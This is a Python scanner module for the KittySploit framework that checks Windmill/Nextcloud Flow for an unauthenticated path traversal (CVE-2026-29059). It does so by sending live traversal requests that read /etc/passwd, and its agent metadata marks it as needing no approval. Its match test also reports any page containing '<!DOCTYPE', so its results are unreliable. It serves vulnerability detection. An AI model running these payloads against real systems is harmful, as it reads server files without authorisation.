#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Windmill < 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Windmill/Nextcloud Flow < 1.603.3 - Unauthenticated Path Traversal Detection',
        'description': 'Windmill < 1.603.3 contains a path traversal caused by unsanitized filename parameter in get_log_file endpoint, letting unauthenticated attackers read arbitrary files on the server, exploit requires no authentication.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'windmill', 'nextcloud', 'lfi', 'unauth', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Chocapikk/Windfall',
            'https://chocapikk.com/posts/2026/windfall-nextcloud-flow-windmill-rce/',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-29059',
        ],
        'cve': 'CVE-2026-29059',
    }

    def run(self):
        for path in ('/api/w/_/jobs_u/get_log_file/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '/api/w/_/jobs_u/get_log_file/..%2F..%2F..%2F..%2Fetc%2Fpasswd', '/index.php/apps/app_api/proxy/flow/api/w/_/jobs_u/get_log_file/..%25252F..%25252F..%25252F..%25252F..%25252F..%25252Fetc%25252Fpasswd', '/index.php/apps/app_api/proxy/flow/api/w/_/jobs_u/get_log_file/..%25252F..%25252F..%25252F..%25252Fetc%25252Fpasswd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('root:x:0:0:', '<!DOCTYPE', 'Err:',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='critical',
                    reason="Windmill/Nextcloud Flow < 1.603.3 - Unauthenticated Path Traversal detected",
                    path=path,
                )
                return True
        return False

